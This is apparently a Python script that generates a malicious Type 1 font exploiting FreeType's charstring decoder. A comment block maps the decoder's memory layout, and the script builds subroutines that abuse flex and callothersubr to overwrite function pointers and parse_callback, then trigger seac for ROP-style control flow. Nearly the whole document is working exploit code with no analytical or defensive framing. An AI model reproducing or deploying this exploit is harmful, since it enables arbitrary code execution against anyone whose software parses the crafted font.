# 0    0x70: stack
# 256 0x470: top
# ...
# 336 0x5b4: ?
# 337 0x5b8: blend
# 338 0x5bc: hint_mode
# 339 0x5c0: parse_callback
# 340 0x5c4: funcs.init
# 341 0x5c8: funcs.done
# 342 0x5cc: funcs.parse_charstrings = t1_decoder_parse_charstrings
# 343 0x5d0: buildchar = <heap>
# 344 0x5d4: len_buildchar = 3
# 345 0x5d8: seac = 0
# 346 0x5dc: ?
# 347 0x5e0: ? = 0x208
# 348 0x5e4: ? = 0
# 349 0x5e8: ? = 0
# 350 0x5ec: ? = t1_driver_class

# first overwrite funcs.done and funcs.parse_charstrings using end flex
# then use THAT to overwrite hint_mode and parse_callback
# then use seac, which will call parse_callback(decoder, glyph idx)

import struct

def to_signed_dec(number):
    number %= (2**32)
    if number >= (2**31): number -= (2**32)
    return str(number)

def encode_unknown(s):
    result = ''
    for char in str(s):
        result += 'UNKNOWN_%d ' % ord(char)
    return result

subrs = {}

file0 = 'i am a file'
file1 = 'i am also a file'

# these are read by the ROP stuff
subrs[0] = encode_unknown(file0)
subrs[1] = encode_unknown(file1)

# start flex
subrs[2] = '0 1 callothersubr ' + '0 2 callothersubr '*7 + 'return'

# start flex, call a certain subr, then come down from 5b4 to bottom of stack - 337 down
subrs[3] = '2 callsubr callsubr ' + 'hstem3 '*14 + '250 42 callothersubr return'

# the first run up
subrs[4] = '''3 0 setcurrentpoint
              -346 42 callothersubr
              callothersubr % now at 341; we could pop pop but that's useless, we need a new location first
              hmoveto
              setcurrentpoint
              hmoveto
              return'''

# the second run up
subrs[5] = '''-343 42 callothersubr
              callothersubr
              return'''


main = '''0 0 setcurrentpoint
          4 3 callsubr         % go up first time
                               % now x is blend, and y is parse_callback
          2 callsubr           % start flex so we can get x and y
          0 0 0 3 0 callothersubr pop pop
          0 2 24 callothersubr % parse_callback -> bca[0]
          1 2 24 callothersubr % blend -> bca[1]

          0                    % start the <= chain
          '''

addies = {0x33825249: '\x85\x5e\x13\x34', 0x31000000: 'return', 0x34000000: 'return'}

subrno = max(filter(lambda a: isinstance(a, int), subrs.keys())) + 1
for addy, data in sorted(addies.items()):
    parse_callback, = struct.unpack('I', data[:4])
    data = data[4:]
    assert parse_callback > 32000
    subrs[subrno] = '0 %s setcurrentpoint return' % to_signed_dec(parse_callback)
    #subrs[subrno+1] = encode_unknown(data)
    subrno += 1

    assert addy > 32000
    main += '\n' + str(subrno) + ' 1 1 25 callothersubr pop ' + to_signed_dec(addy - 1) + ' 4 27 callothersubr pop\n'

main += '''callsubr         % call the selected subr (which should push stuff, set y to an appropriate parse_callback,
                            % then come back down
           5 3 callsubr     % now go up the second time
           0 0 0 64 64 seac % 64 = @
           endchar          % unnecessary if it worked'''

subrs['main'] = main

num_bca = 3

template = open('dejavu.raw.template').read()
template = template.replace('%BCA%', ('0 ' * num_bca)[:-1])
template = template.replace('%THEPROGRAM%', subrs['main'])
template = template.replace('%NUMSUBRS%', '%d' % (len(subrs) - 1))
subrtext = ''
for num, subr in subrs.iteritems():
    if num == 'main': continue
    subrtext += 'dup %d {\n\t%s\n\t} put\n' % (num, subr)
template = template.replace('%SUBRS%', subrtext)

open('dejavu.raw', 'w').write(template)
